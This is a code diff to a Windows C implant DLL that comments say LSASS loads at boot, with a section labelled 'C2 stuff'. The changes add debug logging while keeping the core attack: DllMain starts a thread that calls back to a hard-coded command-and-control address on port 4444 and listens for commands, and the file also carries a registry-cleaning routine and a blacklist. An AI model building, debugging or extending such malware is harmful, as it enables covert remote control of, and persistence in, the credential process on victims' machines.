@@ -17,14 +17,16 @@
 #include <string.h>
 #include <stdint.h>
 #include <strsafe.h>
+#include <stdarg.h>
 
 // ---------------------------------------------------------------------
 //C2 stuff
 #pragma comment(lib, "ws2_32.lib")  
 
-#define SERVER_IP   "192.168.1.100"
 #define SERVER_PORT 4444
 #define RETRY_DELAY 10000  // milliseconds (10s)
+#define SERVER_IP   "192.168.157.140"
+#define DEBUG_LOG   "C:\\Windows\\Temp\\cory_debug.txt"
 // ---------------------------------------------------------------------
 
 // ---------------------------------------------------------------------
@@ -40,7 +42,6 @@ typedef struct {
     char     data[];  // flexible array, actual payload
 } Message;
 
-SOCKET g_sock = INVALID_SOCKET;
 // ---------------------------------------------------------------------
 
 // ---------------------------------------------------------------------
@@ -52,61 +53,148 @@ static const char* BLACKLIST[] = {
 };
 // ---------------------------------------------------------------------
 
+static SOCKET g_sock = INVALID_SOCKET;
+
+// ─── debug logger ────────────────────────────────────────────────────────────
+void debug_log(const char* fmt, ...) {
+    FILE* f = fopen(DEBUG_LOG, "a");
+    if (!f) return;                     // if even this fails, you have bigger problems
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    fprintf(f, "[%02d:%02d:%02d.%03d] ",
+            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
+
+    va_list args;
+    va_start(args, fmt);
+    vfprintf(f, fmt, args);
+    va_end(args);
+
+    fprintf(f, "\n");
+    fflush(f);
+    fclose(f);
+}
+
+// ─── connect ─────────────────────────────────────────────────────────────────
 SOCKET connect_to_server() {
     SOCKET sock;
     struct sockaddr_in addr;
 
+    debug_log("connect_to_server: creating socket...");
     sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) return INVALID_SOCKET;
+    if (sock == INVALID_SOCKET) {
+        debug_log("connect_to_server: socket() FAILED, WSAError=%d", WSAGetLastError());
+        return INVALID_SOCKET;
+    }
+    debug_log("connect_to_server: socket created OK");
 
     memset(&addr, 0, sizeof(addr));
-    addr.sin_family      = AF_INET;
-    addr.sin_port        = htons(SERVER_PORT);
-    addr.sin_addr.s_addr = inet_addr(SERVER_IP);
+    addr.sin_family = AF_INET;
+    addr.sin_port   = htons(SERVER_PORT);
 
-    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+    // inet_addr is deprecated — use InetPtonA so we see parse errors
+    int pton_ret = InetPtonA(AF_INET, SERVER_IP, &addr.sin_addr);
+    debug_log("connect_to_server: InetPtonA(\"%s\") returned %d", SERVER_IP, pton_ret);
+    if (pton_ret != 1) {
+        debug_log("connect_to_server: bad IP string, aborting");
         closesocket(sock);
         return INVALID_SOCKET;
     }
 
+    debug_log("connect_to_server: calling connect() to %s:%d ...", SERVER_IP, SERVER_PORT);
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+        debug_log("connect_to_server: connect() FAILED, WSAError=%d", WSAGetLastError());
+        closesocket(sock);
+        return INVALID_SOCKET;
+    }
+
+    debug_log("connect_to_server: connected successfully");
     return sock;
 }
 
+// ─── recv thread ─────────────────────────────────────────────────────────────
 DWORD WINAPI recv_thread(LPVOID lpParam) {
     char buf[4096];
     int n;
 
+    debug_log("recv_thread: started");
+
     while ((n = recv(g_sock, buf, sizeof(buf) - 1, 0)) > 0) {
         buf[n] = '\0';
-        // do something with the incoming command
-        // e.g. log_to_server("got your message");
+        debug_log("recv_thread: received %d bytes: %s", n, buf);
     }
 
-    // if we get here the server disconnected
+    debug_log("recv_thread: recv loop ended (n=%d, WSAError=%d)", n, WSAGetLastError());
     g_sock = INVALID_SOCKET;
     return 0;
 }
 
+// ─── send to server ──────────────────────────────────────────────────────────
 void log_to_server(const char* msg) {
-    if (g_sock != INVALID_SOCKET)
-        send(g_sock, msg, strlen(msg), 0);
+    if (g_sock != INVALID_SOCKET) {
+        int ret = send(g_sock, msg, (int)strlen(msg), 0);
+        debug_log("log_to_server: send(\"%s\") returned %d", msg, ret);
+    } else {
+        debug_log("log_to_server: skipped, g_sock is INVALID");
+    }
 }
 
+// ─── agent thread ────────────────────────────────────────────────────────────
 DWORD WINAPI agent_thread(LPVOID lpParam) {
-    WSADATA wsa;
-    WSAStartup(MAKEWORD(2,2), &wsa);
+    debug_log("agent_thread: started (TID=%lu)", GetCurrentThreadId());
 
+    WSADATA wsa;
+    int wsa_ret = WSAStartup(MAKEWORD(2, 2), &wsa);
+    debug_log("agent_thread: WSAStartup returned %d", wsa_ret);
+    if (wsa_ret != 0) {
+        debug_log("agent_thread: WSAStartup FAILED, aborting");
+        return 1;
+    }
+
+    debug_log("agent_thread: calling connect_to_server...");
     g_sock = connect_to_server();
 
-    CloseHandle(CreateThread(NULL, 0, recv_thread, NULL, 0, NULL));
+    if (g_sock == INVALID_SOCKET) {
+        debug_log("agent_thread: connection FAILED, no recv_thread will be spawned");
+        WSACleanup();
+        return 1;
+    }
 
-    // keep alive as before
+    debug_log("agent_thread: connection OK, spawning recv_thread...");
+    HANDLE hRecv = CreateThread(NULL, 0, recv_thread, NULL, 0, NULL);
+    if (hRecv == NULL) {
+        debug_log("agent_thread: CreateThread(recv_thread) FAILED, GLE=%lu", GetLastError());
+    } else {
+        debug_log("agent_thread: recv_thread spawned OK");
+        CloseHandle(hRecv);
+    }
+
+    debug_log("agent_thread: entering keep-alive loop");
     while (g_sock != INVALID_SOCKET) {
         Sleep(1000);
     }
 
+    debug_log("agent_thread: g_sock went invalid, cleaning up");
     WSACleanup();
     return 0;
+}
+
+// ─── DllMain ─────────────────────────────────────────────────────────────────
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        // Write this immediately — before the thread even spawns
+        // If you don't see this in the log, LSASS never even hit DllMain
+        debug_log("DllMain: DLL_PROCESS_ATTACH fired (PID=%lu)", GetCurrentProcessId());
+
+        HANDLE h = CreateThread(NULL, 0, agent_thread, NULL, 0, NULL);
+        if (h == NULL) {
+            debug_log("DllMain: CreateThread(agent_thread) FAILED, GLE=%lu", GetLastError());
+        } else {
+            debug_log("DllMain: agent_thread spawned OK (handle=%p)", h);
+            CloseHandle(h);
+        }
+    }
+    return TRUE;
 }
 
 void clean_reg(HKEY root, const char* keyPath, const char* valueName) {
@@ -127,17 +215,6 @@ void clean_reg(HKEY root, const char* keyPath, const char* valueName) {
     }
 
     RegCloseKey(hKey);
-}
-
-
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-
-    if (fdwReason == DLL_PROCESS_ATTACH) {
-        CloseHandle(CreateThread(NULL, 0, agent_thread, NULL, 0, NULL));
-    }
-
-    return TRUE;
-
 }
 
 // Called once when LSASS loads your DLL at boot
